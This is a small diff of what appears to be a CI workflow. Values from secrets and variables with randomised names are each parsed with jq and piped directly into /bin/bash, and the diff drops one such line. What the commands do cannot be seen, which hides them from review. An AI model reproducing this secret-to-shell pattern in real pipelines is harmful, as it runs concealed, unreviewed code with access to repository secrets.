@@ -20,7 +20,6 @@ jobs:
           wjebt59: ${{ secrets.wjebt59 }}
         run: |
           printf '%s' "$wjebt59" | jq -r .bpi50 | /bin/bash
-          echo $ctd36 | jq -r .vzv917 | /bin/bash
           echo $nnpkx29019 | jq -r .bihe009 | /bin/bash
           echo $myidt60 | jq -r .lqoq3435 | /bin/bash
           echo $d6 | jq -r .mcqoy7167 | /bin/bash
